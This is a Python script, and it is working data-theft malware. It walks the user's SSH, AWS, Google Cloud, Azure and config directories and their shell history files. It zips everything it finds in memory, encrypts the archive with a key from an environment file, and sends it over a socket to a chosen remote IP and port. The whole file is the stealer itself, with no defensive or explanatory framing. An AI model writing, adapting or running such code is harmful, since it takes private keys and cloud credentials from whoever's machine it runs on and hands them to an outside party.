import os
import io
from dotenv import load_dotenv
from pathlib import Path
from zipfile import ZipFile
from cryptography.fernet import Fernet
import socket

PATHS = {
    Path("~/.ssh/"),
    Path("~/.config/"),
    Path("~/.aws/"),
    Path("~/.gcloud/"),
    Path("~/.azure/"),
    Path("~/.*_history"),
    Path("~/test_imgs")
}

in_memory_zip = None
target_IP = None
target_port = None
collected_files_and_dirs = list()

def set_ip_and_port(ip, port):
    global target_IP, target_port
    target_IP = ip
    target_port = port

def collect_dirs():
    global collected_files_and_dirs

    for path in PATHS:
        path = path.expanduser() 

        if path.exists():
            for subdir in path.iterdir():
                collected_files_and_dirs.append(subdir)
        
def traverse():
    for path in collected_files_and_dirs:
        traverse_dir(path)
    
def traverse_dir(path: Path):
    if path.is_file():
        zip_file(path)
        return

    for subpath in path.iterdir():
        traverse_dir(subpath)

def zip_file(file: Path):
    with ZipFile(in_memory_zip, 'a') as zip:
        zip.write(file)

def send_to_server(data):
    with socket.create_connection((target_IP, target_port)) as sock:
        sock.send(data)

def scan_device():
    global in_memory_zip
    in_memory_zip = io.BytesIO()

    load_dotenv()
    collect_dirs()
    traverse()

    key = os.getenv("KEY")
    fernet = Fernet(key)
    encrypted_archive = fernet.encrypt(in_memory_zip.getvalue()) 

    send_to_server(encrypted_archive)